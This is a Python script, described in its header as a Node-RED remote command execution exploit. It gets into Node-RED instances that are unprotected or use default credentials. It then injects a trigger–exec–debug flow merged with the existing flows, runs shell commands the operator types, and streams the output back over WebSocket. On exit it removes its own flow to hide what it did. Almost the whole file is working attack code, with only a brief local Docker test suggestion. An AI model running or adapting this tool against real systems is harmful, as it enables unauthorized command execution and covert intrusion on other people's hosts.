#!/usr/bin/env python3
"""
----------------------------------------------------------------------------
"THE BEER-WARE LICENSE" (Revision 42):
QKaiser wrote this file. As long as you retain this notice you
can do whatever you want with this stuff. If we meet some day, and you think
this stuff is worth it, you can buy me a beer in return.
----------------------------------------------------------------------------
----------------------------------------------------------------------------
Node-RED Remote Command Execution exploit.
----------------------------------------------------------------------------
Node-RED web interface is unprotected by default and allow anyone to execute
arbitrary commands on the remote host by crafing the right "flow".

In a few steps:
    1. Create a workflow like the wonderful ASCII diagram below
    2. Set the command of your choosing in "exec" building block
    3. Click on "Deploy"
    4. Push the trigger button
    5. Enjoy your shell

~ RCE building block and wiring ~

      __________        _________                 ____________
     /         /|      /        /|____stderr_____/           /|
    /_________/ /__1_ /________/ /____stdout____/___________/ /
    |_TRIGGER_|/      |__EXEC__|/               |____DEBUG__|/


This script automates everything from creating and updating the workflow with
every command you enter, getting the output back over WebSocket, to cleaning
everything when you leave the shell.

Theoretically, legitimate users should still be able to use Node-RED while you're
updating/interacting with workflows. I made the tool work as transparently as
possible (no suppression of currently deployed flows).

A good way to test against a default install is to use their Docker image:
$ docker run -it -p 1880:1880 --name mynodered nodered/node-red-docker
$ ./noderedsh.py http://localhost:1880
> id
uid=1001(node-red) gid=1001(node-red) groups=1001(node-red)

Update(07/09/2018):
    * script now supports authentication.
    * script now uses random names for flow and blocks so we don't create 
    merge conflicts if targeted Node-RED uses the same names.

Author: Quentin Kaiser <kaiserquentin@gmail.com>
"""

import argparse
import asyncio
import json
import random
import string
import sys
import requests
import websockets

def random_name():
    """
    Generates a random name of length 5 for our blocks and flows.
    """
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(5))

FLOW_NAME = random_name()
INJECT_BLOCK_NAME = random_name()
EXEC_BLOCK_NAME = random_name()
DEBUG_BLOCK_NAME = random_name()


EXEC_FLOW = [
    {
        "id":FLOW_NAME,
        "type":"tab",
        "label":FLOW_NAME,
        "disabled":False,
        "info":""
    },
    {
        "id":INJECT_BLOCK_NAME,
        "type":"inject",
        "z":FLOW_NAME,
        "name":"",
        "topic":"",
        "payload":"",
        "payloadType":"date",
        "repeat":"",
        "crontab":"",
        "once":False,
        "onceDelay":0.1,
        "x":214,
        "y":307,
        "wires":[
            [
                EXEC_BLOCK_NAME
            ]
        ]
    },
    {
        "id":EXEC_BLOCK_NAME,
        "type":"exec",
        "z":FLOW_NAME,
        "command":"",
        "addpay":False,
        "append":"",
        "useSpawn":"False",
        "timer":"",
        "oldrc":False,
        "name":"",
        "x":411,
        "y":318.5,
        "wires":[
            [
                DEBUG_BLOCK_NAME
            ],
            [
                DEBUG_BLOCK_NAME
            ]
        ]
    },
    {
        "id":DEBUG_BLOCK_NAME,
        "type":"debug",
        "z":FLOW_NAME,
        "name":"",
        "active":True,
        "tosidebar":True,
        "console":False,
        "tostatus":False,
        "complete":"false",
        "x":618,
        "y":315,
        "wires":[]
    }
]

def merge_lists(list_1, list_2, key):
    """
    Merge two list of dicts based on dict 'key' uniqueness.

    Args:
        list_1(list): left list
        list_2(list): right list
        key(str): key value to merge on
    Returns:
        merged(list): merged list
    """
    merged = {}
    for item in list_1+list_2:
        if item[key] not in merged:
            merged[item[key]] = item
    return [val for (_, val) in merged.items()]

def need_auth(url):
    """
    Check whether Node-RED requires authentication.

    Args:
        url(str): Node-RED URL (without trailing slash)
    Returns:
        status(bool): 1 if authentication required, 0 otherwise
    """
    response = requests.get("{}/settings".format(url))
    if response.status_code == 401:
        return 1
    return 0

def login(url, username="admin", password="password"):
    """
    Login into Node-RED by requesting a Bearer token.

    Args:
        url(str): Node-RED URL (without trailing slash)
        username(str): Node-RED username
        password(str): Node-RED password
    Returns:
        access_token(str): access_token if authentication successful,
        None otherwise
    """
    data = {
        "client_id":"node-red-editor",
        "grant_type":"password",
        "scope":"",
        "username":username,
        "password":password
    }
    response = requests.post("{}/auth/token".format(url), data=data, verify=False)
    if response.status_code == 200:
        return response.json()["access_token"]
    return None

async def exploit(url, access_token=None):
    """
    Exploit code.

    Args:
        url(str): Node-RED URL (without trailing slash)
        access_token(str): access_token if authentication is required
    Returns:
        None
    """
    ws_url = url.replace("http", "ws")
    headers = {"Node-RED-API-Version": "v2"}

    # Setup authentication token
    if access_token is not None:
        headers["Authorization"] = "Bearer {}".format(access_token)

    async with websockets.connect("{}/comms".format(ws_url)) as websocket:
        # authentication step over websocket
        if access_token is not None:
            await websocket.send(json.dumps({"auth":access_token}))
            while True:
                response = await websocket.recv()
                message = json.loads(response)
                if "auth" in message and message["auth"] == "ok":
                    print("[+] Successfully authenticated over WebSocket.")
                    break

        print("[+] Establishing RCE link ....")
        # subscribe to debug topic to get commands output
        await websocket.send(json.dumps({"subscribe":"debug"}))
        while True:
            try:
                # get currently deployed flows
                current_flows = {"flows":[]}
                resp = requests.get("{}/flows".format(url), headers=headers)
                if "flows" in resp.json():
                    current_flows["flows"] = resp.json()["flows"]
                payload = {"flows":merge_lists(current_flows["flows"], EXEC_FLOW, "id")}
                # we assigned our system command to the 'exec' block
                for flow in payload["flows"]:
                    if flow["id"] == EXEC_BLOCK_NAME:
                        flow["command"] = input("> ")

                # we deploy the new workflow
                resp = requests.post(
                    "{}/flows".format(url),
                    json=payload,
                    headers=headers
                )

                # we trigger the 'inject' block
                resp = requests.post("{}/inject/{}".format(url, INJECT_BLOCK_NAME), headers=headers)

                # we get the command output from our websocket subscription
                output = None
                while output is None:
                    response = await websocket.recv()
                    messages = json.loads(response)
                    for message in messages:
                        if "topic" in message and message["topic"] == "debug":
                            output = message["data"]["msg"].strip()
                            break
                print(output)

            except KeyboardInterrupt:
                # on keyboard interrupt we clean the current workflow from
                # our own additions
                payload = {"flows":[]}
                for current_block in current_flows["flows"]:
                    tainted = False
                    for block in EXEC_FLOW:
                        if block["id"] == current_block["id"]:
                            tainted = True
                    if not tainted:
                        payload["flows"].append(current_block)

                print("\n[+] Cleaning up workflows.")
                # we deploy the clean workflow
                resp = requests.post(
                    "{}/flows".format(url),
                    json=payload,
                    headers=headers
                )
                if resp.status_code == 200:
                    print("[+] Done.")
                else:
                    print("[!] An error occured. Manual cleanup might be required.")
                break
            finally:
                websocket.close()

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description=\
        "Remote Command Execution on Node-RED.")
    parser.add_argument('url', type=str, help="Node-RED URL (without trailing slash)")
    parser.add_argument('--username', type=str, help="Node-RED username")
    parser.add_argument('--password', type=str, help="Node-RED password")
    args = parser.parse_args()

    if need_auth(args.url):
        print("[+] Node-RED requires authentication.")
        if args.username is None and args.password is None:
            print("[+] Trying default credentials.")
            access_token = login(args.url)
        else:
            print("[+] Trying provided credentials.")
            access_token = login(args.url, username=args.username, password=args.password)

        if access_token is None:
            print("[!] An error occured during login procedure. Wrong creds ?")
            sys.exit(1)
        else:
            print("[+] Successfully authenticated over HTTP.")
            asyncio.get_event_loop().run_until_complete(exploit(args.url, access_token))
    else:
        print("[+] Node-RED does not require authentication.")
        asyncio.get_event_loop().run_until_complete(exploit(args.url))
